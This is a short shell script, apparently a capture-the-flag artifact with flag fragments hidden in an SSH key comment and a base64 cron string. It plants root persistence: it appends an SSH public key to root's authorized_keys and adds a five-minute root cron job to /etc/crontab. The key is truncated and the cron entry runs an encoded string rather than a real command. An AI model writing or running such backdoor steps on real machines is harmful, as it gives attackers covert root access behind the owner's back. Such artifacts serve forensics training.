#!/bin/sh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ admin@_3n0_fl4h{NBYC' >> /root/.ssh/authorized_keys
echo '*/5 * * * * root /bin/sh -c "NG5kX2g0bGZfdHcwIX0="' >> /etc/crontab
